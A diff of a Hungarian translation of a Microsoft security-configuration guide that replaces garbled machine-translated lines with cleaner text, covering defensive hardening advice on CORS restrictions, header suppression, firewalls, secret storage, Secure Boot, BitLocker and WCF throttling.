@@ -260,13 +260,13 @@ application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
 ```
 
 ### <a name="example"></a>Példa
-Hello szükséges fejléc csak az adott lapok tooindividual válaszok hozzáadással engedélyezheti: 
+A szükséges fejléc csak az adott lapok egyes válaszok való hozzáadással engedélyezheti: 
 
 ```C#
 this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 ```
 
-## <a id="standard-finger"></a>Távolítsa el a Windows Azure-webhelyek tooavoid ujjlenyomat általános jogú kiszolgálói-fejlécei
+## <a id="standard-finger"></a>Távolítsa el az általános jogú kiszolgálói fejlécek a Windows Azure Web Sites-ujjlenyomat elkerülése érdekében
 
 | Cím                   | Részletek      |
 | ----------------------- | ------------ |
@@ -275,7 +275,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | EnvironmentType – Azure |
 | **Hivatkozások**              | [A Windows Azure Web Sites általános jogú kiszolgálói fejlécek eltávolítása](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
-| **Lépések** | -Kiszolgáló, X-regisztráló-, például fejlécek X-AspNet-verzió hello kiszolgáló és az alapjául szolgáló technológiák hello információk felfedése. Ajánlott toosuppress ezek a fejlécek, ami megakadályozza az ujjlenyomat hello alkalmazás |
+| **Lépések** | Fejlécek, például a kiszolgáló, X-regisztráló-, X-AspNet-verzió a kiszolgáló és az alapjául szolgáló technológiák kapcsolatos információk felfedése. Javasoljuk, hogy ezek a fejlécek ezáltal mellőzése megakadályozza, hogy az alkalmazás-ujjlenyomat |
 
 ## <a id="firewall-db"></a>A Windows tűzfal konfigurálása a hozzáféréshez
 
@@ -285,8 +285,8 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Az SQL Azure, a helyi üzemeltetésű |
 | **Attribútumok**              | N/A, SQL verzió - 12-es verzió |
-| **Hivatkozások**              | [Hogyan tooconfigure egy Azure SQL adatbázis-tűzfal](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [beállítani a Windows tűzfalat a hozzáféréshez](https://msdn.microsoft.com/library/ms175043) |
-| **Lépések** | Tűzfalak működésével toocomputer erőforrások jogosulatlan hozzáférés megelőzése érdekében. tooaccess egy példányát az SQL Server adatbázismotor hello tűzfalon keresztül, konfigurálnia kell hello tűzfal hello futtató SQL Server tooallow hozzáférés |
+| **Hivatkozások**              | [Egy Azure SQL database-tűzfal konfigurálásáról](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [beállítani a Windows tűzfalat a hozzáféréshez](https://msdn.microsoft.com/library/ms175043) |
+| **Lépések** | A Súgó tűzfalrendszerekről jogosulatlan hozzáférés elkerülése érdekében a számítógép-erőforrásokat. Az SQL Server adatbázismotor példánya tűzfalon keresztüli eléréséhez konfigurálnia kell a tűzfal engedélyezi a hozzáférést az SQL Servert futtató számítógép |
 
 ## <a id="cors-api"></a>Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha az ASP.NET Web API CORS engedélyezett
 
@@ -297,10 +297,10 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | **Alkalmazandó technológiák** | MVC 5 |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | [Az ASP.NET Web API 2 eltérő eredetű kérések engedélyezése](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API - ASP.NET Web API 2 a CORS-támogatás](https://msdn.microsoft.com/magazine/dn532203.aspx) |
-| **Lépések** | <p>Böngésző biztonsági megakadályozza, hogy egy weblap AJAX-kérelmek tooanother tartomány. Ez a korlátozás hello azonos eredetű házirend nevezik, és megakadályozza, hogy egy rosszindulatú hely bizalmas adatok olvasása a másik helyről. Azonban néha előfordulhat, hogy szükséges tooexpose API-k biztonságosan, amely más webhelyek is felhasználhatnak. Közötti Origin Resource Sharing (CORS) van olyan W3C szabvány, amely lehetővé teszi, hogy a kiszolgáló toorelax hello azonos eredetű házirend.</p><p>CORS használatával egy kiszolgáló kifejezetten engedélyezhet bizonyos egyes eltérő eredetű kérések elutasítása mások közben. A CORS biztonságosabb és rugalmasabb, mint például a JSONP korábbi technikák.</p>|
+| **Lépések** | <p>Böngésző biztonsági megakadályozza, hogy egy weblap AJAX-kérelmek egy másik tartományra. Ez a korlátozás az azonos eredetű házirend nevezik, és megakadályozza, hogy egy rosszindulatú hely bizalmas adatok olvasása a másik helyről. Azonban néha lehet szükséges API-k biztonságosan közzétételét mely más webhelyek is felhasználhatnak. Alhálózatok közötti Origin Resource Sharing (CORS), amely lehetővé teszi a kiszolgáló a azonos eredetű házirend enyhítése W3C szabvány.</p><p>CORS használatával egy kiszolgáló kifejezetten engedélyezhet bizonyos egyes eltérő eredetű kérések elutasítása mások közben. A CORS biztonságosabb és rugalmasabb, mint például a JSONP korábbi technikák.</p>|
 
 ### <a name="example"></a>Példa
-Hello App_Start/WebApiConfig.cs adja hozzá a következő kód toohello WebApiConfig.Register metódus hello 
+A App_Start/WebApiConfig.cs adja hozzá a következő kódot a WebApiConfig.Register metódus 
 ```C#
 using System.Web.Http;
 namespace WebService
@@ -323,7 +323,7 @@ namespace WebService
 ```
 
 ### <a name="example"></a>Példa
-EnableCors attribútum lehet egy tartományvezérlőre alkalmazott tooaction módszerek az alábbiak szerint: 
+EnableCors attribútum alkalmazható műveletmetódusokhoz egy tartományvezérlőre a következőképpen: 
 
 ```C#
 public class ResourcesController : ApiController
@@ -361,10 +361,10 @@ public class ResourcesController : ApiController
 }
 ```
 
-Vegye figyelembe, hogy a rendszer kritikus fontosságú, hogy a lista tartalmazza a EnableCors attribútum hello tooensure állítsa tooa végesnek és megbízható készletét tartalmazza. Ezen helytelenül eljárva sikertelen tooconfigure (mint pl. hello érték "*") lehetővé teszi a rosszindulatú webhelyeket tootrigger közötti eredetű kérések toohello API, korlátozások nélküli > ezáltal hello API sebezhető tooCSRF támadások. EnableCors vezérlő szintjén látható is el. 
+Vegye figyelembe, hogy nagyon fontos a győződjön meg arról, hogy a források végesnek és megbízható készlete EnableCors attribútum tartalmazza a lista van beállítva. Nem sikerült a beállítás nem megfelelően (például érték szerint "*") lehetővé teszi a rosszindulatú webhelyeket való közötti eredetű kérések, korlátozások nélküli API > ezáltal a CSRF támadásokkal szemben sebezhető az API-t. EnableCors vezérlő szintjén látható is el. 
 
 ### <a name="example"></a>Példa
-egy adott osztály adott metódusra CORS toodisable hello DisableCors attribútum is használható a lent látható módon: 
+Az osztály egy adott metódusra CORS letiltásához a DisableCors attribútum használható alább látható módon: 
 ```C#
 [EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
 public class ResourcesController : ApiController
@@ -377,7 +377,7 @@ public class ResourcesController : ApiController
   {
     return Request.CreateResponse(HttpStatusCode.OK, data);
   }
-  // CORS not allowed because of hello [DisableCors] attribute
+  // CORS not allowed because of the [DisableCors] attribute
   [DisableCors]
   public HttpResponseMessage Delete(int id)
   {
@@ -393,12 +393,12 @@ public class ResourcesController : ApiController
 | **Alkalmazandó technológiák** | MVC 6 |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | [Az ASP.NET Core 1.0 (CORS) eltérő eredetű kérések engedélyezése](https://docs.asp.net/en/latest/security/cors.html) |
-| **Lépések** | <p>Az ASP.NET Core 1.0-s verziójában a CORS engedélyezhető köztes akár segítségével MVC. MVC tooenable CORS hello azonos CORS szolgáltatásokat használja, de a CORS köztes nincs hello használatakor.</p>|
+| **Lépések** | <p>Az ASP.NET Core 1.0-s verziójában a CORS engedélyezhető köztes akár segítségével MVC. MVC használata a CORS engedélyezése esetén az azonos CORS-szolgáltatásokat használja, de a CORS köztes nem.</p>|
 
-**Megközelítés-1** CORS engedélyezése a köztes: hello teljes alkalmazás CORS tooenable hozzáadása hello CORS köztes toohello kérelemfeldolgozási sorban hello UseCors bővítmény metódussal. Eltérő eredetű házirend felvételekor hello CORS köztes hello CorsPolicyBuilder osztály használatával adható meg. Nincsenek két módon toodo ezt:
+**Megközelítés-1** CORS engedélyezése a köztes: engedélyezze a teljes alkalmazás CORS vegye fel a CORS köztes a kérelemfeldolgozási sorban, a UseCors bővítmény metódussal. Eltérő eredetű házirend hozzáadása a CORS köztes a CorsPolicyBuilder osztály használata során adható meg. Ehhez két módja van:
 
 ### <a name="example"></a>Példa
-hello első az toocall UseCors rendelkező egy lambda kifejezésben. hello lambda egy CorsPolicyBuilder objektum hajtja végre: 
+Az egyik UseCors hívja meg egy lambda kifejezésben. A lambda egy CorsPolicyBuilder objektum hajtja végre: 
 ```C#
 public void Configure(IApplicationBuilder app)
 {
@@ -410,7 +410,7 @@ public void Configure(IApplicationBuilder app)
 ```
 
 ### <a name="example"></a>Példa
-hello második toodefine egy vagy több nevű CORS házirendeket, és jelölje ki hello házirend nevű futási időben. 
+A második pedig egy vagy több elnevezett CORS házirendek meghatározása, és válassza a házirend neve futási időben. 
 ```C#
 public void ConfigureServices(IServiceCollection services)
 {
@@ -430,10 +430,10 @@ public void Configure(IApplicationBuilder app)
 }
 ```
 
-**Megközelítés-2** CORS engedélyezése az mvc-ben: a fejlesztők azt is megteheti a MVC tooapply műveletenként, vezérlőnként és globálisan az összes adott CORS.
+**Megközelítés-2** CORS engedélyezése az mvc-ben: a fejlesztők azt is megteheti a MVC műveletenként, vezérlőnként és globálisan az összes adott CORS alkalmazni.
 
 ### <a name="example"></a>Példa
-Műveletenként: a CORS házirendet egy bizonyos művelet toospecify hello [EnableCors] attribútum toohello művelet hozzáadása. Adja meg a hello házirend nevét. 
+Műveletenként: Adja meg a CORS-házirend egy bizonyos művelet adja hozzá a [EnableCors] attribútumot a művelethez. Adja meg a házirend nevét. 
 ```C#
 public class HomeController : Controller
 {
@@ -464,10 +464,10 @@ public void ConfigureServices(IServiceCollection services)
     });
 }
 ```
-Vegye figyelembe, hogy a rendszer kritikus fontosságú, hogy a lista tartalmazza a EnableCors attribútum hello tooensure állítsa tooa végesnek és megbízható készletét tartalmazza. Ezen helytelenül eljárva sikertelen tooconfigure (mint pl. hello érték "*") lehetővé teszi a rosszindulatú webhelyeket tootrigger közötti eredetű kérések toohello API, korlátozások nélküli > ezáltal hello API sebezhető tooCSRF támadások. 
+Vegye figyelembe, hogy nagyon fontos a győződjön meg arról, hogy a források végesnek és megbízható készlete EnableCors attribútum tartalmazza a lista van beállítva. Nem sikerült a beállítás nem megfelelően (például érték szerint "*") lehetővé teszi a rosszindulatú webhelyeket való közötti eredetű kérések, korlátozások nélküli API > ezáltal a CSRF támadásokkal szemben sebezhető az API-t. 
 
 ### <a name="example"></a>Példa
-a CORS toodisable egy tartományvezérlő vagy a művelet, hello [DisableCors] attribútum használata. 
+A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attribútumot. 
 ```C#
 [DisableCors]
     public IActionResult About()
@@ -484,8 +484,8 @@ a CORS toodisable egy tartományvezérlő vagy a művelet, hello [DisableCors] a
 | **SDL fázis**               | Környezet |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
-| **Hivatkozások**              | [Útmutató: Az ASP.NET 2.0 használatával DPAPI konfigurációs szakasz titkosítása](https://msdn.microsoft.com/library/ff647398.aspx), [adja meg egy védett Konfigurációszolgáltatót](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Azure Key Vault használatával tooprotect alkalmazás titkos kulcsok](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
-| **Lépések** | Például hello Web.config konfigurációs fájl, appsettings.json van gyakran használt toohold bizalmas adatokat, beleértve a felhasználónevek, jelszavak, adatbázis-kapcsolati karakterláncok és titkosítási kulcsokat. Ez az információ nem védi, az alkalmazás akkor sebezhető tooattackers vagy rosszindulatú felhasználók megszerezni a bizalmas adatokat, például a fiók felhasználói nevét és a jelszavak, a adatbázis nevét és a kiszolgálók nevei. Hello központi telepítési típus (azure vagy a helyszínen) alapuló, titkosítása hello bizalmas DPAPI-t vagy szolgáltatásokat, mint az Azure Key Vault segítségével konfigurációs fájljainak szakaszait. |
+| **Hivatkozások**              | [Útmutató: Az ASP.NET 2.0 használatával DPAPI konfigurációs szakasz titkosítása](https://msdn.microsoft.com/library/ff647398.aspx), [adja meg egy védett Konfigurációszolgáltatót](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Azure Key Vault használatával alkalmazás titkos kulcsok védelme](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
+| **Lépések** | Konfigurációs fájlok, például a Web.config fájlként appsettings.json gyakran használt bizalmas adatokat, beleértve a felhasználónevek, jelszavak, adatbázis-kapcsolati karakterláncok és titkosítási kulcsok tárolásához. Ha ezt az információt nem védi, az alkalmazás ki van téve a támadók vagy rosszindulatú felhasználók megszerezni a bizalmas adatokat, például a fiók felhasználói nevét és a jelszavak, a adatbázis nevét és a kiszolgálók nevei. Alapján a központi telepítési típus (azure vagy a helyszínen), titkosítsa a bizalmas DPAPI-t vagy szolgáltatásokat, mint az Azure Key Vault segítségével konfigurációs fájljainak szakaszait. |
 
 ## <a id="admin-strong"></a>Győződjön meg arról, hogy az összes felügyeleti felületeiről biztosított erős hitelesítő adatokkal
 
@@ -496,7 +496,7 @@ a CORS toodisable egy tartományvezérlő vagy a művelet, hello [DisableCors] a
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | N/A  |
-| **Lépések** | Minden felügyeleti felületek hello eszközökön, vagy mező átjáró tesz elérhetővé titkosítani kell erős hitelesítő adataival. Is bármely egyéb kitett felületek, például Wi-Fi, SSH, fájlmegosztások, FTP titkosítani kell erős hitelesítő adatokkal. Alapértelmezett érték a gyenge jelszavakat nem lehet használni. |
+| **Lépések** | Bármely felügyeleti felületek, amely az eszköz vagy mező átjáró mutatja meg kell-e titkosítani erős hitelesítő adataival. Is bármely egyéb kitett felületek, például Wi-Fi, SSH, fájlmegosztások, FTP titkosítani kell erős hitelesítő adatokkal. Alapértelmezett érték a gyenge jelszavakat nem lehet használni. |
 
 ## <a id="unknown-exe"></a>Győződjön meg arról, hogy ismeretlen kód nem hajtható végre olyan eszközök
 
@@ -507,7 +507,7 @@ a CORS toodisable egy tartományvezérlő vagy a művelet, hello [DisableCors] a
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | [A biztonságos rendszerindítás és az AppLocker-bit Eszköztitkosítás a Windows 10 IoT Core engedélyezése](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
-| **Lépések** | UEFI biztonságos rendszerindítás korlátozza hello rendszer tooonly a megadott hatóság aláírásával bináris fájl futtatását teszi lehetővé. Ez a szolgáltatás megakadályozó ismeretlen kód hello platformon végrehajtott és potenciálisan gyengítése hello biztonságot azt. Engedélyezze a UEFI biztonságos rendszerindítás, és korlátozhatja hello tartozó kód aláírása megbízható tanúsítványszolgáltatók listáját. Hello megbízható hitelesítésszolgáltatók egyikével hello eszközön telepített összes kód aláírása. |
+| **Lépések** | UEFI biztonságos rendszerindítás korlátozza a rendszer csak a megadott hatóság aláírásával bináris fájlok futtatását teszi lehetővé. Ez a szolgáltatás megakadályozó ismeretlen kód végrehajtása a platform és potenciálisan gyengítése azt a biztonsági állapotát. Engedélyezze a UEFI biztonságos rendszerindítás, és korlátozhatja az tartozó kód aláírása megbízható tanúsítványszolgáltatók listáját. Az eszközt a megbízható hitelesítésszolgáltatók telepített összes kód aláírása. |
 
 ## <a id="partition-iot"></a>Az operációs rendszer és az AppLocker-bit az IoT-eszközök további partíciók titkosítása
 
@@ -518,9 +518,9 @@ a CORS toodisable egy tartományvezérlő vagy a művelet, hello [DisableCors] a
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | N/A  |
-| **Lépések** | Windows 10 IoT Core bit-tároló Eszköztitkosítás, amelynek hello platformon, beleértve hello szükséges preOS protokoll, amely hello szükséges mérések végez UEFI TPM hello jelenléte erős függőség van egyszerűsített verziója valósítja meg. E preOS mérések győződjön meg arról, hogy az operációs rendszer újabb tartalmaz hogyan hello OS elindult végleges bejegyzést hello. Az operációs rendszer partíciók bit-tároló és a további partíciókat is használ, ha azokat a bizalmas adatokat tárolhatnak titkosításához. |
+| **Lépések** | Windows 10 IoT Core megvalósítja az Eszköztitkosítás bit-tároló, erős függőség, hogy tartalmazza a platformon, beleértve a szükséges preOS protokoll, amely a szükséges mérési adatokon végez UEFI TPM Modullal rendelkező egyszerűsített verziója. E preOS mérések ügyeljen arra, hogy az operációs rendszer újabb hogyan elindult az operációs rendszer végleges rekordja. Az operációs rendszer partíciók bit-tároló és a további partíciókat is használ, ha azokat a bizalmas adatokat tárolhatnak titkosításához. |
 
-## <a id="min-enable"></a>Győződjön meg arról, hogy csak hello minimális szolgáltatások vagy szolgáltatások engedélyezve vannak-e az eszközökön
+## <a id="min-enable"></a>Győződjön meg arról, hogy csak a minimális szolgáltatások vagy szolgáltatások engedélyezve vannak-e az eszközökön
 
 | Cím                   | Részletek      |
 | ----------------------- | ------------ |
@@ -529,7 +529,7 @@ a CORS toodisable egy tartományvezérlő vagy a művelet, hello [DisableCors] a
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | N/A  |
-| **Lépések** | Ne engedélyezze és ne kapcsolja ki a bármely szolgáltatások vagy az operációs rendszer, amelyre nincs szükség hello megoldás hello működéséhez hello szolgáltatást. A pl. Ha hello eszköz nem követeli meg a felhasználói felület toobe telepítve, telepítse a Windows IoT távfelügyeleti módban. |
+| **Lépések** | Ne engedélyezze és ne kapcsolja ki a szolgáltatások vagy az operációs rendszer, amelyre nincs szükség a megoldás működéséhez a szolgáltatások. A például ha az eszköz nem igényli a központi felhasználói Felületet, telepítse a Windows IoT távfelügyeleti módban. |
 
 ## <a id="field-bit-locker"></a>Az operációs rendszer és az AppLocker-bit IoT mező átjáró további partíciók titkosítása
 
@@ -540,9 +540,9 @@ a CORS toodisable egy tartományvezérlő vagy a művelet, hello [DisableCors] a
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | N/A  |
-| **Lépések** | Windows 10 IoT Core bit-tároló Eszköztitkosítás, amelynek hello platformon, beleértve hello szükséges preOS protokoll, amely hello szükséges mérések végez UEFI TPM hello jelenléte erős függőség van egyszerűsített verziója valósítja meg. E preOS mérések győződjön meg arról, hogy az operációs rendszer újabb tartalmaz hogyan hello OS elindult végleges bejegyzést hello. Az operációs rendszer partíciók bit-tároló és a további partíciókat is használ, ha azokat a bizalmas adatokat tárolhatnak titkosításához. |
+| **Lépések** | Windows 10 IoT Core megvalósítja az Eszköztitkosítás bit-tároló, erős függőség, hogy tartalmazza a platformon, beleértve a szükséges preOS protokoll, amely a szükséges mérési adatokon végez UEFI TPM Modullal rendelkező egyszerűsített verziója. E preOS mérések ügyeljen arra, hogy az operációs rendszer újabb hogyan elindult az operációs rendszer végleges rekordja. Az operációs rendszer partíciók bit-tároló és a további partíciókat is használ, ha azokat a bizalmas adatokat tárolhatnak titkosításához. |
 
-## <a id="default-change"></a>Győződjön meg arról, hogy hello mező átjáró hello alapértelmezett bejelentkezési hitelesítő adatok megváltoznak a telepítés során
+## <a id="default-change"></a>Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat, a mező átjáró telepítésekor legyenek módosítva
 
 | Cím                   | Részletek      |
 | ----------------------- | ------------ |
@@ -551,9 +551,9 @@ a CORS toodisable egy tartományvezérlő vagy a művelet, hello [DisableCors] a
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | N/A  |
-| **Lépések** | Győződjön meg arról, hogy hello mező átjáró hello alapértelmezett bejelentkezési hitelesítő adatok megváltoznak a telepítés során |
+| **Lépések** | Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat, a mező átjáró telepítésekor legyenek módosítva |
 
-## <a id="cloud-firmware"></a>Győződjön meg arról, hogy hello Felhőátjáróhoz valósítja meg a folyamat tookeep hello csatlakoztatott eszközök belső vezérlőprogram toodate mentése
+## <a id="cloud-firmware"></a>Győződjön meg arról, hogy az átjáró megvalósítja-e olyan folyamatot, amely a csatlakoztatott eszközök belső vezérlőprogram naprakészen tartása
 
 | Cím                   | Részletek      |
 | ----------------------- | ------------ |
@@ -561,8 +561,8 @@ a CORS toodisable egy tartományvezérlő vagy a művelet, hello [DisableCors] a
 | **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | Átjáró choice - Azure IoT Hub |
-| **Hivatkozások**              | [Az IoT Hub eszköz kezelése-áttekintés](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [hogyan tooupdate eszköz belső vezérlőprogram](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
-| **Lépések** | LWM2M egy olyan protokoll, az IoT-felügyeleti nyissa meg a Mobile Alliance hello. Az Azure IoT-eszközfelügyeleti lehetővé teszi, hogy toointeract a fizikai eszközök eszköz feladatok. Győződjön meg arról, hogy hello Felhőátjáróhoz valósítja meg a folyamat tooroutinely megtartása hello eszköz és egyéb konfigurációs adatok mentése toodate kezelés Azure IoT Hub használatával. |
+| **Hivatkozások**              | [Az IoT Hub eszköz kezelése-áttekintés](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [eszköz belső vezérlőprogram frissítése](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
+| **Lépések** | LWM2M egy olyan protokoll, az IoT-felügyeleti a nyitott Mobile Alliance. Az Azure IoT-eszközfelügyeleti lehetővé teszi a fizikai eszközök eszköz feladatok segítségével kommunikál. Győződjön meg arról, hogy az átjáró megvalósítja-e olyan folyamatot, amely rendszeresen megtartja-e az eszköz és más konfigurációs adatokat használó Azure IoT Hub Eszközkezelés dátummal záródó részéből. |
 
 ## <a id="controls-policies"></a>Győződjön meg arról, hogy eszközök szervezeti házirendek szerint beállított végpont biztonsági vezérlő
 
@@ -584,7 +584,7 @@ a CORS toodisable egy tartományvezérlő vagy a művelet, hello [DisableCors] a
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | [Az Azure Storage biztonsági útmutató - a Tárfiók kulcsait kezelése](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
-| **Lépések** | <p>Kulcstároló:, Akkor ajánlott toostore hello Azure Tárelérési kulcsot az Azure Key Vault egy titkos kulcsként, és hello kulcs lekérése kulcstároló hello alkalmazásokat. Az ajánlott miatt toohello következő okok miatt:</p><ul><li>hello alkalmazás soha nem lesz hello tárolási kulcs szoftveresen kötött a konfigurációs fájlban, amely eltávolítja az adott erőfeszítések valaki fog hozzáférni toohello kulcsok külön engedélye nélkül az</li><li>Toohello hívóbetűk Azure Active Directory használatával lehet irányítani. Ez azt jelenti, hogy egy fiók tulajdonosának biztosíthat hozzáférést toohello néhány olyan tooretrieve hello kulcsok Azure Key Vault származó alkalmazásokat. Más alkalmazások nem lesznek képesek tooaccess hello kulcsok anélkül, hogy azok kifejezetten engedéllyel kellene</li><li>Kulcs újragenerálása: Ajánlott toohave egy folyamatot az Azure storage access hely tooregenerate kulcsok biztonsági okokból. Miért és hogyan tooplan a kulcs újragenerálása ismertetett hello Azure tárolási biztonsági útmutatója részleteinek cikk hivatkozik</li></ul>|
+| **Lépések** | <p>Kulcstároló: Javasoljuk, hogy az Azure Storage elérési kulcsok tárolása az Azure Key Vault valamilyen titkos adatot, és az alkalmazásokat, a kulcs lekérése kulcstároló. Ez az alábbi okokból ajánlott:</p><ul><li>Az alkalmazás soha nem lesz a tárolási kulcs szoftveresen kötött a konfigurációs fájlban, amely egy, a kulcsok külön engedélye nélkül hozzáférést az adott erőfeszítések eltávolítja</li><li>A kulcsoknak Access Azure Active Directory használatával lehet irányítani. Ez azt jelenti, hogy a fiók tulajdonosának hozzáférést biztosíthat a néhány olyan alkalmazásokat, amelyek a kulcsok lekérése az Azure Key Vault kell. Más alkalmazások nem tudják a hívóbetűk őket engedély megadása kifejezetten nélkül</li><li>Kulcs újragenerálása: Javasoljuk, hogy rendelkezik egy folyamatot, hogy biztonsági okokból Azure tárelérési kulcsok újragenerálása. Arról, hogy miért részleteit és a kulcs újragenerálása tervezéséről az Azure Storage biztonsági útmutató áttekintésével foglalkozó cikkben ismertetett</li></ul>|
 
 ## <a id="cors-storage"></a>Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha a CORS engedélyezve van az Azure storage
 
@@ -594,8 +594,8 @@ a CORS toodisable egy tartományvezérlő vagy a művelet, hello [DisableCors] a
 | **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
-| **Hivatkozások**              | [Hello Azure Storage szolgáltatásainak CORS-támogatás](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
-| **Lépések** | Az Azure Storage tooenable CORS – Cross eredetű erőforrások megosztása lehetővé teszi. Minden tárfiók hello erőforrásokhoz, hogy a tárfiók tartományokat is megadhat. A CORS alapértelmezés szerint le van tiltva az összes szolgáltatás. A CORS hello REST API vagy hello tárolási ügyfél könyvtár toocall hello módszerek tooset hello szolgáltatás házirendek egyikét használatával engedélyezheti. |
+| **Hivatkozások**              | [Az Azure Storage szolgáltatásainak CORS-támogatás](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
+| **Lépések** | Az Azure Storage lehetővé teszi a kereszt-eredetű erőforrások megosztása – a CORS engedélyezése. Minden tárfiók férhetnek hozzá a fiókhoz tartozó tárolási erőforrások tartományokat is megadhat. A CORS alapértelmezés szerint le van tiltva az összes szolgáltatás. Engedélyezheti a CORS hívja service házirendek beállítása a módszerek egyikét a REST API-t vagy a storage ügyféloldali kódtár segítségével. |
 
 ## <a id="throttling"></a>A WCF szolgáltatás szabályozásával engedélyezése
 
@@ -606,10 +606,10 @@ a CORS toodisable egy tartományvezérlő vagy a művelet, hello [DisableCors] a
 | **Alkalmazandó technológiák** | .NET-keretrendszer 3 |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [erősítse meg Királyság](https://vulncat.fortify.com/en/vulncat/index.html) |
-| **Lépések** | <p>Erőforrások erőforrás-fogyási, és végső soron szolgáltatásmegtagadást okozhat a rendszer nem helyezi maximális hello használja.</p><ul><li>**Magyarázat:** Windows Communication Foundation (WCF) hello képességét toothrottle szolgáltatáskérések kínál. Túl sok ügyfél kérésének engedélyezése a rendszer kéréssekkel, és az erőforrások lefoglalhat. A hello ugyanakkor, így csak kevés kérelem tooa szolgáltatás képes megakadályozni legitim felhasználók hello szolgáltatás használatával. Minden szolgáltatás konfigurált külön-külön bennünket tooand tooallow hello megfelelő mennyiségű erőforrást kell lennie.</li><li>**JAVASLATOK** engedélyezése WCF szabályozási szolgáltatás és a megadott korlát a megfelelő alkalmazás.</li></ul>|
+| **Lépések** | <p>A rendszer-erőforrások nem helyezi maximális Erőforrásfogyás, és végső soron egy szolgáltatásmegtagadási eredményezheti.</p><ul><li>**Magyarázat:** Windows Communication Foundation (WCF) lehetővé teszi a szolgáltatáskérések szabályozás. Túl sok ügyfél kérésének engedélyezése a rendszer kéréssekkel, és az erőforrások lefoglalhat. Másrészről így csak kevés egy szolgáltatási kérelmet megakadályozhatják legitim felhasználók a szolgáltatás használatával. Minden szolgáltatás külön-külön legyen beállítva, hogy és konfigurálva ahhoz, hogy a megfelelő mennyiségű erőforrást.</li><li>**JAVASLATOK** engedélyezése WCF szabályozási szolgáltatás és a megadott korlát a megfelelő alkalmazás.</li></ul>|
 
 ### <a name="example"></a>Példa
-hello következő egy példa konfiguráció sávszélesség-szabályozás engedélyezve:
+A következő egy példa konfiguráció sávszélesség-szabályozás engedélyezve:
 ```
 <system.serviceModel> 
   <behaviors>
@@ -629,20 +629,20 @@ hello következő egy példa konfiguráció sávszélesség-szabályozás enged�
 | **Alkalmazandó technológiák** | .NET-keretrendszer 3 |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [erősítse meg Királyság](https://vulncat.fortify.com/en/vulncat/index.html) |
-| **Lépések** | Metaadatok segítségével a támadók hello rendszer információ, és tervezze meg a támadás űrlap. WCF-szolgáltatások konfigurált tooexpose metaadatok lehet. Metaadatok szolgáltatás részletes leírását tartalmazza, és nem kell éles környezetben szórási. Hello `HttpGetEnabled`  /  `HttpsGetEnabled` hello ServiceMetaData osztály tulajdonságait határozza meg, hogy egy szolgáltatás hello metaadatok teszi közzé. | 
+| **Lépések** | Metaadatok segítségével a támadók további tudnivalók a rendszer, és tervezze meg a támadást egy formája. WCF szolgáltatások úgy konfigurálhatók teszi közzé a metaadatok. Metaadatok szolgáltatás részletes leírását tartalmazza, és nem kell éles környezetben szórási. A `HttpGetEnabled`  /  `HttpsGetEnabled` a konfigurációs ServiceMetaData osztály tulajdonságait határozza meg, hogy a szolgáltatás a metaadatok teszi közzé. | 
 
 ### <a name="example"></a>Példa
-az alábbi kód hello utasítja WCF toobroadcast a szolgáltatás metaadatai
+Az alábbi kódot arra utasítja a szolgáltatás metaadatai közvetíti WCF
 ```
 ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
 smb.HttpGetEnabled = true; 
 smb.HttpGetUrl = new Uri(EndPointAddress); 
 Host.Description.Behaviors.Add(smb); 
 ```
